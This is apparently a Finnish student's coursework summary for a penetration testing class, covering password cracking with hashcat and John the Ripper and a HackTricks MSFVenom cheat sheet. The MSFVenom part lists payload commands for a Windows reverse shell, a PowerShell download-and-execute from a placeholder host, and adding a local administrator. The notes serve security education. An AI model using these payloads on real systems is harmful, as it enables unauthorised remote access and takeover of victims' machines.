# H4 - Marraskuu2024!
##### Pentesting course taught by Tero Karvinen @ Haaga-Helia

## x) Lue/Katso ja tiivistä
### Karvinen 2022: Cracking Passwords with Haschat
- Plaintext-salasanojen sijaan järjestelmät tallentavat hasheja. Hashia ei voi muuttaa takaisin salasanaksi
- Samalla hashaus-menetelmällä hashatut salasanat antavat aina saman hashin, eli jos menetelmä on tiedossa niin sama salasana antaa saman hashin.
- Hashcat tarvitsee sanakirjan jonka avulla se voi vertailla salasanojen hasheja kräkättävään hashiin

### Karvinen 2023: Crack File Password with John
- Mikäli .zip-tiedoston sisältö on enkryptattu, tiedosto voidaan kyllä purkaa mutta kansio on tyhjä
- Jumbo John pystyy kräkkäämään suuren määrän eri tiedostomuotoja
- John käyttää myös sanakirjahyökkäystä
- Jumbo Johnista on myös maksullinen versio, mutta seuraamalla Teron ohjetta artikkelista sen saa koottua git:in avulla ilmaiseksi

### € Santos et al 2017: Security Penetration Testing - The Art of Hacking Series LiveLessons: Lesson 6: Hacking User Credentials
- Suurin osa järjestelmistä säilyttää salasanoja käyttäjätunnuksia ja salasanoja tietokannassa tai tekstitiedostossa
- Puolustajan näkökulmasta, säilöttyjen salasanojen lisäksi heidän tarvitsee suojata myös verkkoliikenteessä liikkuvia salasanoja
- John the Ripper käyttää oletuksena sanakirjanaan listaa yleisimmistä ihmisten käyttämistä salasanoista. Listaan voi lisätä omia salasanojaan, tai sitten voit luoda kokonaan uuden listan

### Polop et al 2024: HackTricks: MSFVenom
- MSFVenom on työkalu jolla saa tehtyä omia haittaohjelmia
- Hyökkääjän kannalta h yödyllisiltä kommenoilta vaikuttavat ne jotka luovat Shell yhteyden, tai suorittavat komennon:
  - Reverse Shell (Kohde kone avaa itse yhteyden hyökkääjäkoneeseen):
 
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
  - Execute Command:

        msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
        msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
- Nämä komennot ovat erityisesti Windows-ympäristöihin

# Lähteet:

- Karvinen, T. 2022. Cracking Passwords with Hashcat. Luettavissa: https://terokarvinen.com/2022/cracking-passwords-with-hashcat/. Luettu: 20.11.2024
- Karvinen, T. 2023. Crack File Password with John. Luettavissa: https://terokarvinen.com/2023/crack-file-password-with-john/. Luettu: 20.11.2024
- Santos, O., Sternstein, J., Taylor, R., McCoy, C. 2017. Security Penetration Testing - The Art of Hacking Series. Video. Katsottavissa: https://learning.oreilly.com/videos/security-penetration-testing/9780134833989/9780134833989-sptt_00_06_00_00/. Katsottu: 21.11.2024
- HackTricks s.a. MSFVenom - CheatSheet. Luettavissa: https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom. Luettu: 20.11.2024
